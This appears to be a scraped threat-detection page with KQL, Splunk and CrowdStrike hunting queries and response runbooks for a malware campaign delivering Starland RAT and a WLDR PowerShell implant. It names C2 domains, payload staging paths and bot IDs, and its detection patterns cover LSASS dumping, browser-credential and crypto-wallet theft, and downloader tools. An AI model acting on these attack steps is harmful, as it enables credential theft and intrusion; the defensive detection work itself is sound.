| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Weaponized HTA download-and-execute via mshta.exe from UAT-11795 staging domains (ClickFix) · [LLM] web-devtools.com raw shellcode staging fetch (/starlandfox, /x32remka, /dopfile) · Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — UAT-11795 deploys novel Starland RAT and bespoke WLDR C2 implant in financially
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Trojanized software installer (MobaXterm/WebEx/Zoom/DBeaver/FACEIT) spawning Python bytecode loader · [LLM] UAT-11795 scheduled-task persistence via New-ScheduledTask 'PythonLauncher-' entry · Suspicious browser extension installation · Scheduled task created with suspicious image / encoded args · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] WLDR PowerShell C2 beacon to eorthopaedics/sastoro under /feed/ and /alpha/ HWID paths · [LLM] Starland RAT HWID-bound C2 to windowscreenrepairnearme/aipythondevs from Python · [LLM] Polygon smart-contract Eth_call fallback C2 resolution (JSON-RPC to polygon-rpc) · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Starland RAT browser-credential and cryptocurrency-wallet harvesting by Python · Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process
Weaponized HTA download-and-execute via mshta.exe from UAT-11795 staging domains (ClickFix) AIDelivery High
Hunts mshta.exe launching a remote HTA stager, the ClickFix entry point UAT-11795 uses to pull trojanized installers. Article-specific: correlates mshta with the staging domains (zynaris.io, eorthopaedics.com, sastoro.com, web-devtools.com) and/or mshta spawning installer/PowerShell children. Rationale: Article names mshta.exe as the weaponized-HTA entry point via ClickFix and lists the exact staging domains; mshta with a remote URL or one of these domains is high-fidelity and rare in user space. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/
ATT&CKT1218.005 T1566.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legacy internal LOB apps that legitimately invoke mshta with an intranet HTA URL
  • IT packaging/deployment scripts that stage HTA-based configuration tools
  • Security tooling that simulates ClickFix for awareness training
  • Rare vendor installers that shell out to mshta over HTTPS
Suppression filter
| where not (ProcessCommandLine has_any ("intranet.","corp.local") and InitiatingProcessFileName in~ ("explorer.exe","ccmexec.exe"))
Response runbook
1) Triage: pull the full mshta command line and the remote URL/domain; check whether the domain is in the UAT-11795 staging list and whether mshta spawned a child installer or powershell.exe. 2) Contain: isolate the host, block the staging domain at proxy/DNS, and kill the mshta process tree. 3) Hunt: pivot on the same host for trojanized installer names (MobaXterm/WebEx/Zoom/DBeaver/FACEIT) and python.exe spawned from an NSIS installer within the following hour.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "mshta.exe"
| where AccountName !endswith "$"
| where ProcessCommandLine has_any ("http://","https://",".hta","zynaris.io","eorthopaedics.com","sastoro.com","web-devtools.com")
| project Timestamp, DeviceName, AccountName, ParentImage=InitiatingProcessFileName, ParentCmd=InitiatingProcessCommandLine, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\mshta.exe"
| where CommandLine has_any ("http://","https://",".hta","zynaris.io","eorthopaedics.com","sastoro.com","web-devtools.com")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Trojanized software installer (MobaXterm/WebEx/Zoom/DBeaver/FACEIT) spawning Python bytecode loader AIInstallation High
Hunts the UAT-11795 execution stage where an NSIS installer masquerading as legitimate software launches byte-compiled Python that loads Starland RAT in memory. Article-specific: keys on the exact trojanized installer filenames spawning python.exe/pythonw.exe from a temp/install path. Rationale: Article lists the exact trojanized installer filenames and states they bundle a malicious Python package that byte-compiles/executes Starland RAT; a signed-software-named installer spawning Python is a near-unique combination. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://securityaffairs.com/195532/malware/new-russian-campaign-uses-fake-webex-and-zoom-installers-to-deploy-starland-rat.html
ATT&CKT1059.006 T1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A genuine developer bundling a Python-based post-install helper inside an installer
  • Legitimate MobaXterm/DBeaver builds that ship an embedded Python runtime for plugins
  • IT repackaging tools that wrap installers and invoke Python during MSI transforms
  • Security sandbox detonation of the same installers during analysis
Suppression filter
| where not (InitiatingProcessFolderPath has_any (@"\Program Files\Mobatek\", @"\Program Files\DBeaver\") and SHA256 in~ (""))
Response runbook
1) Triage: confirm the parent installer's signature and hash — legitimate MobaXterm/WebEx/Zoom/DBeaver/FACEIT are signed; an unsigned or mismatched-hash binary spawning Python is malicious. Capture the child Python command line/script path. 2) Contain: isolate the host, quarantine the installer and any %TEMP% Python artifacts. 3) Hunt: check outbound to api.telegram.org (bot 8384531459/skuefq_bot, 7993597060/komandastuk_bot) and to the C2 domains, plus New-ScheduledTask 'PythonLauncher-' persistence.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("MobaXterm_v26.1.exe","WebEx_Client.exe","dbeaver-ce-windows-x86_64.exe","FaceitInstaller_x64.exe") or InitiatingProcessCommandLine has "Zoom" and InitiatingProcessCommandLine has "install"
| where FileName in~ ("python.exe","pythonw.exe")
| project Timestamp, DeviceName, AccountName, Installer=InitiatingProcessFileName, InstallerFolder=InitiatingProcessFolderPath, ChildCmd=ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName has_any ("MobaXterm_v26.1.exe","WebEx_Client.exe","dbeaver-ce-windows-x86_64.exe","FaceitInstaller_x64.exe")
| where NewProcessName endswith "\\python.exe" or NewProcessName endswith "\\pythonw.exe"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

WLDR PowerShell C2 beacon to eorthopaedics/sastoro under /feed/ and /alpha/ HWID paths AICommand & Control High
Hunts the WLDR PowerShell memory implant beaconing to its dual C2 domains over HWID-parameterized URL paths (/feed/ on eorthopaedics.com, /alpha/ on sastoro.com). Article-specific: pins on both domains and their functional paths rather than generic PowerShell egress. Rationale: Article names eorthopaedics.com (/feed/) and sastoro.com (/alpha/) as parallel WLDR C2 and states the PowerShell implant beacons over HWID paths; PowerShell reaching either domain is a direct C2 hit corroborated by second-source reporting. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://cyberpress.org/uat-11795-spreads-dual-backdoors/
ATT&CKT1059.001 T1071.001
Data sourcesNetwork_Resolution.DNS Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A user legitimately browsing eorthopaedics.com if it is a hijacked-but-still-live legitimate site
  • Security crawler/URL-sandbox retrieving the domains for analysis
  • Threat-intel enrichment tooling resolving the IOC domains
  • DNS logging of passive resolver traffic not tied to a real infection
Suppression filter
| where InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe")
Response runbook
1) Triage: confirm the initiating process is powershell.exe/pwsh.exe (not a browser) and capture the full URL to see the /feed/ or /alpha/ HWID path. 2) Contain: block eorthopaedics.com and sastoro.com at DNS/proxy, isolate the host, capture the PowerShell script block for the WLDR loader. 3) Hunt: enumerate other hosts resolving either domain and pivot to Starland RAT C2 (windowscreenrepairnearme.com, aipythondevs.com) and Polygon Eth_call fallback traffic.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe")
| where RemoteUrl has_any ("eorthopaedics.com","sastoro.com")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any ("eorthopaedics.com","sastoro.com")
| project TimeGenerated, Computer, ClientIP, Name, QueryType, IPAddresses=Result
| order by TimeGenerated desc

Starland RAT HWID-bound C2 to windowscreenrepairnearme/aipythondevs from Python AICommand & Control High
Hunts the Starland Python RAT beaconing to its primary C2 domains with the C: volume serial number as the final URL path component. Article-specific: pins on python.exe/pythonw.exe egress to windowscreenrepairnearme.com and aipythondevs.com. Rationale: Article names windowscreenrepairnearme.com and aipythondevs.com as the primary C2 for the Starland Python RAT and states C2 URLs append the C: volume serial number; resolution of either domain is a direct C2 indicator. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/
ATT&CKT1571 T1095
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Passive DNS/threat-intel tooling resolving the IOC domains for enrichment
  • URL sandbox detonation resolving the C2 domains
  • A hijacked domain still serving benign content to unrelated visitors
  • Analyst manually browsing the domain during investigation
Response runbook
1) Triage: confirm the initiating process is python.exe/pythonw.exe and inspect the URL for a trailing numeric HWID path component (volume serial). 2) Contain: block both C2 domains, isolate host, snapshot memory (Starland runs in-memory). 3) Hunt: pivot to the intermediate-payload chains — x64 shellcode → CastleStealer, x32 shellcode → Remcos — and check for Polygon smart-contract fallback queries.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("python.exe","pythonw.exe")
| where RemoteUrl has_any ("windowscreenrepairnearme.com","aipythondevs.com")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any ("windowscreenrepairnearme.com","aipythondevs.com")
| project TimeGenerated, Computer, ClientIP, Name, QueryType, IPAddresses=Result
| order by TimeGenerated desc

Polygon smart-contract Eth_call fallback C2 resolution (JSON-RPC to polygon-rpc) AICommand & Control Medium
Hunts Starland RAT's resilience mechanism: an Eth_call JSON-RPC request that reads the XOR-encrypted fallback C2 from Polygon contract 0x6ae382ed2154cc84c6672e4e908cd2c69c1b35ba. Article-specific: keys on the contract address and eth_call to public Polygon RPC endpoints from non-wallet processes. Rationale: Article states Starland RAT retrieves an XOR-encrypted fallback C2 from Polygon contract 0x6ae382ed... via a public JSON-RPC Eth_call; a Python/PowerShell host querying a Polygon RPC endpoint is anomalous on a corporate endpoint and a specific resilience indicator. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
ATT&CKT1102 T1568
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A developer legitimately running a Web3/blockchain Python or PowerShell script against Polygon
  • Crypto trading/analytics tooling that queries polygon-rpc from python
  • Blockchain node health-check scripts
  • Security research on the same contract
Suppression filter
| where not (DeviceName has_any ("DEV-","BUILD-") and InitiatingProcessCommandLine has "web3")
Response runbook
1) Triage: confirm the initiating process (python/powershell) and whether the host has any legitimate Web3 workload; capture the JSON-RPC body for eth_call to 0x6ae382ed2154cc84c6672e4e908cd2c69c1b35ba. 2) Contain: block the Polygon RPC egress from that host, isolate, and preserve memory. 3) Hunt: the decoded contract value is a fallback C2 domain — extract it, add to blocklists, and sweep the org for resolution of that domain plus the primary Starland C2s.

| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("python.exe","pythonw.exe","powershell.exe","pwsh.exe")
| where RemoteUrl has_any ("polygon-rpc.com","polygon-mainnet.infura.io","rpc.ankr.com","maticvigil.com")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any ("polygon-rpc.com","polygon-mainnet.infura.io","rpc.ankr.com","maticvigil.com")
| project TimeGenerated, Computer, ClientIP, Name, QueryType
| order by TimeGenerated desc

web-devtools.com raw shellcode staging fetch (/starlandfox, /x32remka, /dopfile) AIDelivery High
Hunts retrieval of Starland RAT intermediate shellcode payloads from the web-devtools.com staging host under its named payload paths. Article-specific: the exact URL paths that serve x64/x32 shellcode (CastleStealer / Remcos loaders). Rationale: Article lists the exact web-devtools.com payload paths (/starlandfox, /x32remka, /dopfile) that serve raw x64/x32 shellcode; any request to these paths is unambiguous staging retrieval. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
ATT&CKT1105 T1027
Data sourcesWeb.Web Network_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Proxy/URL-sandbox tooling fetching the IOC paths for analysis
  • Threat-intel enrichment pulling the staged samples
  • Rare collision where an unrelated site path matches (mitigated by full domain+path match)
  • Analyst manually retrieving the payload during triage
Response runbook
1) Triage: identify the process that fetched the path and whether the response was written to %TEMP% and executed. 2) Contain: block web-devtools.com, isolate host, quarantine the downloaded payload. 3) Hunt: determine which payload was pulled — /x32remka → Remcos, x64 → CastleStealer — and sweep for the matching stealer/RAT behaviors and C2 domains org-wide.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "web-devtools.com"
| where RemoteUrl has_any ("/starlandfox","/x32remka","/dopfile")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationHostName has "web-devtools.com" or RequestURL has "web-devtools.com"
| where RequestURL has_any ("/starlandfox","/x32remka","/dopfile")
| project TimeGenerated, SourceIP, DestinationHostName, RequestURL, RequestClientApplication, DeviceProduct
| order by TimeGenerated desc

UAT-11795 scheduled-task persistence via New-ScheduledTask 'PythonLauncher-' entry AIInstallation Medium
Hunts the campaign's persistence: a scheduled task named PythonLauncher-{3 random chars} created via New-ScheduledTask to relaunch the Python loader. Article/image-anchored: the New-ScheduledTask cmdlet and the PythonLauncher- task-name prefix. Rationale: Article's code blocks expose the exact persistence artifacts New-ScheduledTask and the task name pattern PythonLauncher-{3 random characters}; the combined string match is highly specific to this campaign. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
ATT&CKT1053.005 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate internal tool literally named 'PythonLauncher' scheduling itself (rare, verify path)
  • Developer automation creating Python-runner scheduled tasks
  • Software that registers a Python interpreter launch task during install
  • Admin scripting that reuses the PythonLauncher string coincidentally
Suppression filter
| where not (Evidence has_any (@"\Program Files\") and AccountName in~ ("system"))
Response runbook
1) Triage: read the scheduled task action/command — a PythonLauncher- task pointing at a %TEMP%/AppData Python payload is malicious; note the creating account and parent process. 2) Contain: delete the task, isolate host, quarantine the referenced payload. 3) Hunt: pivot from the task's target script to the trojanized installer origin and outbound Starland/WLDR C2, and sweep other hosts for the PythonLauncher- task-name prefix.
union
( DeviceProcessEvents
  | where Timestamp > ago(30d)
  | where FileName in~ ("powershell.exe","pwsh.exe")
  | where ProcessCommandLine has "New-ScheduledTask" and ProcessCommandLine has "PythonLauncher-"
  | project Timestamp, DeviceName, AccountName, Evidence=ProcessCommandLine ),
( DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "ScheduledTaskCreated"
  | where AdditionalFields has "PythonLauncher-"
  | project Timestamp, DeviceName, AccountName, Evidence=AdditionalFields )
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| where TaskName has "PythonLauncher-" or EventData has "PythonLauncher-"
| project TimeGenerated, Computer, SubjectUserName, TaskName=coalesce(TaskName, ObjectName), EventData
| order by TimeGenerated desc

Starland RAT browser-credential and cryptocurrency-wallet harvesting by Python AIActions on Objectives Medium
Hunts Starland RAT/CastleStealer collection behavior: a python.exe/pythonw.exe (or non-browser) process reading Chrome/Edge/Firefox Login Data and crypto-wallet directories. Article-specific: ties wallet/browser theft to the in-memory Python RAT rather than a browser itself. Rationale: Article states Starland RAT steals browser data and cryptocurrency wallets and that CastleStealer targets credentials/wallets; a Python process (the in-memory RAT host) reading browser Login Data plus wallet stores is a strong collection signal, with the >=2-path threshold cutting benign single touches. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/ • https://securityaffairs.com/195532/malware/new-russian-campaign-uses-fake-webex-and-zoom-installers-to-deploy-starland-rat.html
ATT&CKT1555.003 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Python browser-automation (Selenium/Playwright) reading a Chrome profile
  • Backup or migration tooling written in Python copying browser profiles
  • Developer scripts iterating Firefox profiles for testing
  • Crypto-wallet management scripts a user runs themselves
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("selenium","playwright","webdriver") )
Response runbook
1) Triage: confirm the Python process lineage — trace it back to a trojanized installer or the byte-compiled loader; benign Selenium runs come from dev tooling. 2) Contain: isolate host, force-reset the user's browser-stored and any wallet credentials, and revoke sessions. 3) Hunt: check for exfil to the C2 domains and to api.telegram.org (bots skuefq_bot/komandastuk_bot which receive wallet inventories), and look for CastleStealer/Remcos shellcode delivery on the same host.
DeviceFileEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("python.exe","pythonw.exe")
| where FolderPath has_any (@"\Google\Chrome\User Data", @"\Microsoft\Edge\User Data", @"\Mozilla\Firefox\Profiles", @"\Exodus", @"\Electrum", @"\Ethereum", @"\com.liberty.jaxx")
   or FileName in~ ("Login Data","wallet.dat","key3.db","logins.json")
| summarize PathsTouched=dcount(FolderPath), Sample=any(FolderPath), FirstSeen=min(Timestamp) by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessId
| where PathsTouched >= 2
| order by FirstSeen desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("python.exe","pythonw.exe")
| where TargetFilePath has_any (@"\Google\Chrome\User Data", @"\Microsoft\Edge\User Data", @"\Mozilla\Firefox\Profiles", @"\Exodus", @"\Electrum", @"\Ethereum")
   or TargetFileName in~ ("Login Data","wallet.dat","key3.db","logins.json")
| summarize PathsTouched=dcount(TargetFilePath), Sample=any(TargetFilePath) by DvcHostname, ActorUsername, ActingProcessName, ActingProcessId
| where PathsTouched >= 2
| order by DvcHostname asc
source:windows.sysmon @EventID:11 @Image:(*\python.exe OR *\pythonw.exe OR *\Python.exe) @TargetFilename:(*\Google\Chrome\User Data* OR *\Microsoft\Edge\User Data* OR *\Mozilla\Firefox\Profiles* OR *\Exodus* OR *\Electrum* OR *wallet.dat OR *Login?Data)
#event_simpleName=FileOpenInfo ContextImageFileName=/\\pythonw?\.exe$/i
| TargetFileName=/(\\Google\\Chrome\\User Data|\\Microsoft\\Edge\\User Data|\\Mozilla\\Firefox\\Profiles|\\Exodus|\\Electrum|\\Ethereum|wallet\.dat|Login Data)/i
| groupBy([aid, ComputerName, ContextImageFileName], function=count(field=TargetFileName, distinct=true))
| _count >= 2

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Microsoft Security BlogStepSecurity
2026-07-16 18 use cases 8 techniques 6 kill-chain phases detected

Threat actors compromised AsyncAPI packages and weaponized trusted CI/CD workflows to distribute malware through npm. This analysis breaks down the attack chain, payload delivery, and recommended defenses. Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Compromised @asyncapi npm package versions resolved into node_modules / Yarn cache · [LLM] Node.js retrieving Miasma second stage from IPFS gateway (specific CIDs) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
